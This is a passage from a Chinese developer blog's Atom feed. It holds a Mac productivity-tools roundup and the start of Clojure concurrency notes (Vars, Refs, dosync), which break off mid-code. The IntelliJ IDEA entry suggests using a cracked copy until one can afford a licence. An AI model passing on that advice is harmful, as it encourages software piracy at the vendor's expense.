&lt;p&gt;这一年，是我人生的又一个转折点。因为，我终于走出了校园，迈进了社会。阿里是一座大学，让我很快就适应了这里的生活。尤其是园区的五个食堂可以每天都吃不同的食堂，午饭有补贴、晚饭免费、夜宵免费，害的我半年就胖了10斤…斤…&lt;/p&gt;
&lt;p&gt;言归正传，今年主要就分为两个阶段，前半年是在校的毕业期，后半年是入职的菜鸟期。&lt;/p&gt;
    
    </summary>
    
      <category term="随笔生活" scheme="http://wuchong.me/categories/%E9%9A%8F%E7%AC%94%E7%94%9F%E6%B4%BB/"/>
    
    
      <category term="生活" scheme="http://wuchong.me/tags/%E7%94%9F%E6%B4%BB/"/>
    
  </entry>
  
  <entry>
    <title>高效Macbook开发之道(工具篇)</title>
    <link href="http://wuchong.me/blog/2015/11/21/macbook-productive-tools/"/>
    <id>http://wuchong.me/blog/2015/11/21/macbook-productive-tools/</id>
    <published>2015-11-21T13:09:06.000Z</published>
    <updated>2015-11-22T15:40:53.000Z</updated>
    
    <content type="html">&lt;p&gt;程序员就像工匠，若想高效地编写出漂亮的代码，就得要有一把好”锤子”——好的开发工具。就像老罗提出匠心与情怀，程序员对于手中的工具也是饱含工匠情怀的。所以，本文就讲讲那些我用出情怀的高效工具们。&lt;/p&gt;
&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;
&lt;h2 id=&quot;Macbook&quot;&gt;&lt;a href=&quot;#Macbook&quot; class=&quot;headerlink&quot; title=&quot;Macbook&quot;&gt;&lt;/a&gt;Macbook&lt;/h2&gt;&lt;p&gt;毋庸置疑，首先你得有台Macbook，这是脱离鼠标提升效率的第一步。所以本文基本上都是推荐Mac上的工具。&lt;/p&gt;
&lt;h2 id=&quot;笔记-amp-编辑器&quot;&gt;&lt;a href=&quot;#笔记-amp-编辑器&quot; class=&quot;headerlink&quot; title=&quot;笔记&amp;amp;编辑器&quot;&gt;&lt;/a&gt;笔记&amp;amp;编辑器&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;&lt;a href=&quot;http://zh.mweb.im/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;MWeb&lt;/a&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;我的笔记需求很简单，1. 支持Markdown与预览 2. 支持笔记分类管理 3. 简洁美观。哦，要是能直接在Markdown中粘贴图片就更好了。MWeb是我目前用过这么多产品里唯一全符合这些要求的。已购。&lt;/p&gt;
&lt;p&gt;EvenNote不支持Markdown，太重。Mou缺少文档管理。Cmd Markdown，离线版还有待改进。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://ww2.sinaimg.cn/large/81b78497gw1ey8g8xmqb9j212o0oljyv.jpg&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;&lt;a href=&quot;http://www.sublimetext.com/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;Sublime&lt;/a&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Sublime是一款具有丰富扩展功能的编辑器。作为前端开发者，完全可以用如此轻量的工具作为前端IDE。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://ww2.sinaimg.cn/large/81b78497gw1ey8g1n19emj20qt0hzn22.jpg&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;&lt;a href=&quot;https://atom.io/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;Atom&lt;/a&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Atom的推出就是要取代Sublime的。两者功能差不多，可以说Atom深受Sublime哲学的影响。Atom对于包管理更加方便，代码补全也是出色的功能之一。优秀的界面设计，让我这视觉动物忍不住就用上了。就是相对Sublime而言，做的有些重了。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://ww1.sinaimg.cn/large/81b78497gw1ey8g3ijl21j21bs0lo458.jpg&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&quot;开发工具&quot;&gt;&lt;a href=&quot;#开发工具&quot; class=&quot;headerlink&quot; title=&quot;开发工具&quot;&gt;&lt;/a&gt;开发工具&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;&lt;a href=&quot;https://www.jetbrains.com/idea/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;IntelliJ IDEA&lt;/a&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Java IDE的不二之选。强大，强大，强大，记得一定要上Ultimate版，资金充足就付费，不充足就先用破解，记得靠IDEA赚到钱了得回来补上。用惯后会极大提高开发速度。重复代码自动检查、代码规范提示等功能还能帮你纠正编码规范。快捷键尽量用默认的，不要用Eclipse快捷键，虽然一开始会有点难以适应，但是用久了会发现爽的飞起。IDEA是可以为之单独写篇文章安利的产品，此处不再多说。另外Jetbrains家族的产品都很良心，RubyMine、Pycharm、WebStorm都是不错的IDE。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://ww3.sinaimg.cn/large/81b78497gw1ey8hba8qylj21kw119arz.jpg&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;&lt;a href=&quot;https://kapeli.com/dash&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;Dash&lt;/a&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Dash是一个API文档浏览器，以及代码片段管理工具。作为一名程序员，每天必不可少的动作就是查各种API文档，为了搜一个函数打开好几个web窗口是很常见的事。Dash可以提高我们的效率，尤其是我为它绑定了&lt;code&gt;shift+space&lt;/code&gt;的快捷键之后，在全屏IDE中我可以直接呼出dash查询想要的类/函数。已购。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://ww3.sinaimg.cn/large/81b78497gw1ey8hcd4mg7j20t40k80xv.jpg&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;&lt;a href=&quot;http://iterm2.com/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;iTerm 2&lt;/a&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;自带的Terminal其实也还行，不过有很多理由让我们用iTerm 2。例如设置主题、各种快捷键、方便的复制查找。再配合上&lt;a href=&quot;http://ohmyz.sh/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;Oh My Zsh&lt;/a&gt; ，简直爽到爆！&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&quot;绿色上网&quot;&gt;&lt;a href=&quot;#绿色上网&quot; class=&quot;headerlink&quot; title=&quot;绿色上网&quot;&gt;&lt;/a&gt;绿色上网&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;&lt;a href=&quot;https://github.com/shadowsocks/shadowsocks-iOS/releases/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;ShadowSocks X&lt;/a&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Shadowsocks在Mac上的客户端。[蜡烛]&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;&lt;a href=&quot;https://itunes.apple.com/us/app/surge-web-developer-tool-proxy/id1040100637?ls=1&amp;amp;mt=8&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;Surge.app&lt;/a&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;iOS 9的一个神级API，以及给力的app开发者，终于带给iOS用户们一个安全、低成本、最大网络速度、无连接状态、国内外分流的完美解决方案。终于可以在碎片时间获取国外的最新资讯了。&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&quot;其他&quot;&gt;&lt;a href=&quot;#其他&quot; class=&quot;headerlink&quot; title=&quot;其他&quot;&gt;&lt;/a&gt;其他&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;&lt;a href=&quot;http://www.eudic.net/eudic/mac_dictionary.aspx&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;欧陆词典&lt;/a&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Mac自带的字典其实已经很方便了，三指轻按在阅读英文文档时非常方便，但不能满足查单词的需求。而Mac上的词典确实比较少，也就这款用的比较顺手，我绑定了&lt;code&gt;option+space&lt;/code&gt;快捷键，可以轻松从顶部呼出搜索栏。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;&lt;a href=&quot;https://www.wunderlist.com/zh/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;奇妙清单&lt;/a&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;奇妙清单是一款任务管理工具，可用于记事提醒、工作安排、待办清单、项目管理等工作，重点的是它免费且跨平台支持 iOS、Android、Windows、Mac、网页版等。虽然同类优秀的TODO产品众多，不过这款产品清一色的五星好评值得你拥有。目前我一直用它来管理工作、生活、学习上的事项，用的很顺。支持国产免费软件。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;&lt;a href=&quot;https://www.omnigroup.com/omnigraffle/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;OminiGraffle&lt;/a&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;作为程序员，免不了要画些流程图什么的。OmniGraffle绝对是Mac上最好用的流程图软件，画出来的图颜值爆表。当然，这是收费的。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;Chrome插件&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;关于Chrome插件我这里只推荐两个吧。一个是&lt;a href=&quot;https://chrome.google.com/webstore/detail/%E5%9B%B4%E8%84%96%E6%98%AF%E4%B8%AA%E5%A5%BD%E5%9B%BE%E5%BA%8A/pngmcllbdfgmhdgnnpfaciaolgbjplhe&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;围脖是个好图床&lt;/a&gt;，可以方便的通过粘贴、拖拽将图片上传到新浪微博图床，并拿到链接。另一个是&lt;a href=&quot;https://chrome.google.com/webstore/detail/proxy-switchyomega/padekgcemlokbadohgkifijomclgjgif&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;Proxy SwitchyOmega&lt;/a&gt;，SwitchySharp的升级版，搭配ss能代理工具使用。&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
</content>
    
    <summary type="html">
    
      程序员就像工匠，若想高效地编写出漂亮的代码，就得要有一把好&quot;锤子&quot;——好的开发工具。就像老罗提出匠心与情怀，程序员对于手中的工具也是饱含工匠情怀的。所以，本文就讲讲那些我用出情怀的高效工具们。
    
    </summary>
    
      <category term="杂项资源" scheme="http://wuchong.me/categories/%E6%9D%82%E9%A1%B9%E8%B5%84%E6%BA%90/"/>
    
    
      <category term="工具" scheme="http://wuchong.me/tags/%E5%B7%A5%E5%85%B7/"/>
    
  </entry>
  
  <entry>
    <title>Clojure学习笔记（三）：并发与引用</title>
    <link href="http://wuchong.me/blog/2015/11/06/learn-clojure-3-concurrent/"/>
    <id>http://wuchong.me/blog/2015/11/06/learn-clojure-3-concurrent/</id>
    <published>2015-11-06T06:45:03.000Z</published>
    <updated>2015-11-07T07:29:45.000Z</updated>
    
    <content type="html">&lt;p&gt;很多人是为了更好地进行并发编程而选择了Clojure，但Clojure所有的数据都是只读的，除非你使用引用类型（Vars、Ref、Atom、Agent）来标明它们是可以修改的。Clojure处理并发的思路与众不同，采用的是&lt;a href=&quot;http://en.wikipedia.org/wiki/Software_transactional_memory&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;Software Transactional Memory&lt;/a&gt; (STM)来实现的，即软事务内存。你可以将STM想象成数据库，只不过是内存型的，它只支持事务的ACI，也就是原子性、一致性、隔离性，但是不包括持久性，因为状态的保存都在内存里。引用类型是一种可变引用指向不可变数据的一种机制。Clojure的并发API分为四种模型：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;管理Thread local变量的Var。&lt;/li&gt;
&lt;li&gt;管理协作式、同步修改可变状态的Ref&lt;/li&gt;
&lt;li&gt;管理非协作式、同步修改可变状态的Atom&lt;/li&gt;
&lt;li&gt;管理异步修改可变状态的Agent&lt;/li&gt;
&lt;/ol&gt;
&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;
&lt;h2 id=&quot;Vars&quot;&gt;&lt;a href=&quot;#Vars&quot; class=&quot;headerlink&quot; title=&quot;Vars&quot;&gt;&lt;/a&gt;Vars&lt;/h2&gt;&lt;p&gt;Vars 是一种引用类型，它可以有一个被所有线程共享的root binding，并且每个线程还能拥有自己(thread-local)的值。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;def&lt;/strong&gt;&lt;br&gt;&lt;code&gt;def&lt;/code&gt; 定义, 将会影响全局定义。&lt;/p&gt;
&lt;figure class=&quot;highlight clojure&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;(&lt;span class=&quot;name&quot;&gt;&lt;span class=&quot;builtin-name&quot;&gt;def&lt;/span&gt;&lt;/span&gt; v &lt;span class=&quot;number&quot;&gt;2&lt;/span&gt;) &lt;span class=&quot;comment&quot;&gt;; -&amp;gt; 2&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;let&lt;/strong&gt;&lt;br&gt;&lt;code&gt;let&lt;/code&gt; 定义, 将会影响自身生命周期内,以及自己作用域内,如果超出自己的作用域,则无效。&lt;/p&gt;
&lt;figure class=&quot;highlight clojure&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;(&lt;span class=&quot;name&quot;&gt;&lt;span class=&quot;builtin-name&quot;&gt;def&lt;/span&gt;&lt;/span&gt; name &lt;span class=&quot;string&quot;&gt;&quot;jark&quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;(&lt;span class=&quot;name&quot;&gt;&lt;span class=&quot;builtin-name&quot;&gt;let&lt;/span&gt;&lt;/span&gt; [name &lt;span class=&quot;string&quot;&gt;&quot;wuchong&quot;&lt;/span&gt;] &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  (&lt;span class=&quot;name&quot;&gt;println&lt;/span&gt; name)) &lt;span class=&quot;comment&quot;&gt;; -&amp;gt; 输出 wuchong&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;(&lt;span class=&quot;name&quot;&gt;println&lt;/span&gt; name) &lt;span class=&quot;comment&quot;&gt;; -&amp;gt; 输出 jark&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;binding&lt;/strong&gt;&lt;br&gt;&lt;code&gt;binding&lt;/code&gt;, 将会影响自身生命周期以及自己作用域内，即使超出自身作用域,也都有效。&lt;/p&gt;
&lt;p&gt;这个例子演示了binding和set!一起使用，用set!来修改一个由binding bind的Var的线程本地的值。&lt;/p&gt;
&lt;figure class=&quot;highlight clojure&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;(&lt;span class=&quot;name&quot;&gt;&lt;span class=&quot;builtin-name&quot;&gt;def&lt;/span&gt;&lt;/span&gt; ^&lt;span class=&quot;symbol&quot;&gt;:dynamic&lt;/span&gt; v &lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;) &lt;span class=&quot;comment&quot;&gt;; 需要声明成&quot;dynamic&quot;，v才能用binding来改变值。&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;(&lt;span class=&quot;name&quot;&gt;&lt;span class=&quot;builtin-name&quot;&gt;defn&lt;/span&gt;&lt;/span&gt; change-it []&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  (&lt;span class=&quot;name&quot;&gt;println&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;&quot;2) v =&quot;&lt;/span&gt; v) &lt;span class=&quot;comment&quot;&gt;; -&amp;gt; 1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  (&lt;span class=&quot;name&quot;&gt;&lt;span class=&quot;builtin-name&quot;&gt;def&lt;/span&gt;&lt;/span&gt; v &lt;span class=&quot;number&quot;&gt;2&lt;/span&gt;) &lt;span class=&quot;comment&quot;&gt;; changes root value&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  (&lt;span class=&quot;name&quot;&gt;println&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;&quot;3) v =&quot;&lt;/span&gt; v) &lt;span class=&quot;comment&quot;&gt;; -&amp;gt; 2&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  (&lt;span class=&quot;name&quot;&gt;binding&lt;/span&gt; [v &lt;span class=&quot;number&quot;&gt;3&lt;/span&gt;] &lt;span class=&quot;comment&quot;&gt;; binds a thread-local value&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    (&lt;span class=&quot;name&quot;&gt;println&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;&quot;4) v =&quot;&lt;/span&gt; v) &lt;span class=&quot;comment&quot;&gt;; -&amp;gt; 3&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    (&lt;span class=&quot;name&quot;&gt;&lt;span class=&quot;builtin-name&quot;&gt;set!&lt;/span&gt;&lt;/span&gt; v &lt;span class=&quot;number&quot;&gt;4&lt;/span&gt;) &lt;span class=&quot;comment&quot;&gt;; changes thread-local value&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    (&lt;span class=&quot;name&quot;&gt;println&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;&quot;5) v =&quot;&lt;/span&gt; v)) &lt;span class=&quot;comment&quot;&gt;; -&amp;gt; 4&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  (&lt;span class=&quot;name&quot;&gt;println&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;&quot;6) v =&quot;&lt;/span&gt; v)) &lt;span class=&quot;comment&quot;&gt;; thread-local value is gone now -&amp;gt; 2&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;(&lt;span class=&quot;name&quot;&gt;println&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;&quot;1) v =&quot;&lt;/span&gt; v) &lt;span class=&quot;comment&quot;&gt;; -&amp;gt; 1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;(&lt;span class=&quot;name&quot;&gt;&lt;span class=&quot;builtin-name&quot;&gt;let&lt;/span&gt;&lt;/span&gt; [thread (&lt;span class=&quot;name&quot;&gt;Thread.&lt;/span&gt; #(&lt;span class=&quot;name&quot;&gt;change-it&lt;/span&gt;))] &lt;span class=&quot;comment&quot;&gt;; 启动一个本地线程&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  (&lt;span class=&quot;name&quot;&gt;.start&lt;/span&gt; thread)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  (&lt;span class=&quot;name&quot;&gt;.join&lt;/span&gt; thread)) &lt;span class=&quot;comment&quot;&gt;; 等待线程结束&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;(&lt;span class=&quot;name&quot;&gt;println&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;&quot;7) v =&quot;&lt;/span&gt; v) &lt;span class=&quot;comment&quot;&gt;; -&amp;gt; 2&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;好吧，说了这么多，其实Clojure不鼓励我们使用Vars，因为Vars在线程间不能很好地协作。&lt;/p&gt;
&lt;h2 id=&quot;Refs&quot;&gt;&lt;a href=&quot;#Refs&quot; class=&quot;headerlink&quot; title=&quot;Refs&quot;&gt;&lt;/a&gt;Refs&lt;/h2&gt;&lt;p&gt;Refs是用来协调对于一个或者多个binding的并发修改的。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;ref&lt;/strong&gt;&lt;/p&gt;
&lt;figure class=&quot;highlight clojure&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;; 用ref函数创建一个可变的引用(reference)，一个空的歌曲集合&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;(&lt;span class=&quot;name&quot;&gt;&lt;span class=&quot;builtin-name&quot;&gt;def&lt;/span&gt;&lt;/span&gt; song (&lt;span class=&quot;name&quot;&gt;&lt;span class=&quot;builtin-name&quot;&gt;ref&lt;/span&gt;&lt;/span&gt; #&amp;#123;&amp;#125;))&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;(&lt;span class=&quot;name&quot;&gt;println&lt;/span&gt; @song) &lt;span class=&quot;comment&quot;&gt;; -&amp;gt; #&amp;#123;&amp;#125;  用@来读取ref值&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;validator&lt;/strong&gt;&lt;br&gt;类似数据库，可以为ref添加“约束”，在数据更新的时候需要通过validator函数的验证，如果验证不通过，整个事务将回滚。&lt;/p&gt;
&lt;figure class=&quot;highlight clojure&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;(&lt;span class=&quot;name&quot;&gt;&lt;span class=&quot;builtin-name&quot;&gt;def&lt;/span&gt;&lt;/span&gt; validate-song&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;     (&lt;span class=&quot;name&quot;&gt;&lt;span class=&quot;builtin-name&quot;&gt;partial&lt;/span&gt;&lt;/span&gt; every? #(&lt;span class=&quot;name&quot;&gt;&lt;span class=&quot;builtin-name&quot;&gt;not&lt;/span&gt;&lt;/span&gt; (&lt;span class=&quot;name&quot;&gt;&lt;span class=&quot;builtin-name&quot;&gt;nil?&lt;/span&gt;&lt;/span&gt; %)))) &lt;span class=&quot;comment&quot;&gt;; 定义了歌名不能为空的validator&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;(&lt;span class=&quot;name&quot;&gt;&lt;span class=&quot;builtin-name&quot;&gt;def&lt;/span&gt;&lt;/span&gt; song (&lt;span class=&quot;name&quot;&gt;&lt;span class=&quot;builtin-name&quot;&gt;ref&lt;/span&gt;&lt;/span&gt; #&amp;#123;&amp;#125; &lt;span class=&quot;symbol&quot;&gt;:validator&lt;/span&gt; validate-song))&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;dosync &amp;amp; ref-set&lt;/strong&gt;&lt;/p&gt;
&lt;figure class=&quot;highlight clojure&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;; 改变引用指向的内容，使用ref-set函数&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;(&lt;span class=&quot;name&quot;&gt;&lt;span class=&quot;builtin-name&quot;&gt;ref-set&lt;/span&gt;&lt;/span&gt; song #&amp;#123;&lt;span class=&quot;string&quot;&gt;&quot;Dangerous&quot;&lt;/span&gt;&amp;#125;) &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;; -&amp;gt; IllegalStateException: No transaction running&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;; 会报错，因为引用是可变的，对状态的更新需要用事务进行保护，使用dosync&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;(&lt;span class=&quot;name&quot;&gt;&lt;span class=&quot;builtin-name&quot;&gt;dosync&lt;/span&gt;&lt;/span&gt; (&lt;span class=&quot;name&quot;&gt;&lt;span class=&quot;builtin-name&quot;&gt;ref-set&lt;/span&gt;&lt;/span&gt; song #&amp;#123;&lt;span class=&quot;string&quot;&gt;&quot;Dangerous&quot;&lt;/span&gt;&amp;#125;))&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;; 因为我们加了不能为空的validator，加入空会报错&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;(&lt;span class=&quot;name&quot;&gt;&lt;span class=&quot;builtin-name&quot;&gt;dosync&lt;/span&gt;&lt;/span&gt; (&lt;span class=&quot;name&quot;&gt;&lt;span class=&quot;builtin-name&quot;&gt;ref-set&lt;/span&gt;&lt;/span&gt; song #&amp;#123;&amp;#125;)) &lt;span class=&quot;comment&quot;&gt;; -&amp;gt; IllegalStateException Invalid reference state&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;; 可以对多个ref的更新放在一个事务里&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;(&lt;span class=&quot;name&quot;&gt;&lt;span class=&quot;builtin-name&quot;&gt;dosync&lt;/span&gt;&lt;/span&gt; (&lt;span class=&quot;name&quot;&gt;&lt;span class=&quot;builtin-name&quot;&gt;ref-set&lt;/span&gt;&lt;/span&gt; song #&amp;#123;&lt;span class=&quot;string&quot;&gt;&quot;Dangerous&quot;&lt;/span&gt;&amp;#125;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;             (&lt;span class=&quot;name&quot;&gt;&lt;span class=&quot;builtin-name&quot;&gt;ref-set&lt;/span&gt;&lt;/span&gt; singer #&amp;#123;&lt;span class=&quot;string&quot;&gt;&quot;MJ&quot;&lt;/span&gt;&amp;#125;) )&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;ul&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;alter &amp;amp; commute&lt;/strong&gt;&lt;br&gt;更改引用有点暴力也比较少见，更常见的更新是根据当前状态更新，比如加一首歌进去。&lt;/p&gt;
&lt;figure class=&quot;highlight clojure&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;; 先查询集合内容，然后往集合里添加歌曲，然后更新整个集合&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;(&lt;span class=&quot;name&quot;&gt;&lt;span class=&quot;builtin-name&quot;&gt;dosync&lt;/span&gt;&lt;/span&gt; (&lt;span class=&quot;name&quot;&gt;&lt;span class=&quot;builtin-name&quot;&gt;ref-set&lt;/span&gt;&lt;/span&gt; song (&lt;span class=&quot;name&quot;&gt;&lt;span class=&quot;builtin-name&quot;&gt;conj&lt;/span&gt;&lt;/span&gt; @song &lt;span class=&quot;string&quot;&gt;&quot;heal the world&quot;&lt;/span&gt;)))&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;; 